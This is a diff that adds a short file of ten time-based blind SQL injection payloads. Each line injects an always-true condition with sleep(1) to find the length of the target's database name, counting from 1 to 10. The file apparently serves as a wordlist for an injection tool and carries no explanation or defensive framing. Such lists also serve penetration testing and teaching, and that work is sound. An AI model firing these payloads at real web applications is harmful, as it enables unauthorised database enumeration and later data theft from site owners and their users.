@@ -1,0 +1,10 @@
+' or 1=1 and length(database())=1 and sleep(1)#
+' or 1=1 and length(database())=2 and sleep(1)#
+' or 1=1 and length(database())=3 and sleep(1)#
+' or 1=1 and length(database())=4 and sleep(1)#
+' or 1=1 and length(database())=5 and sleep(1)#
+' or 1=1 and length(database())=6 and sleep(1)#
+' or 1=1 and length(database())=7 and sleep(1)#
+' or 1=1 and length(database())=8 and sleep(1)#
+' or 1=1 and length(database())=9 and sleep(1)#
+' or 1=1 and length(database())=10 and sleep(1)#
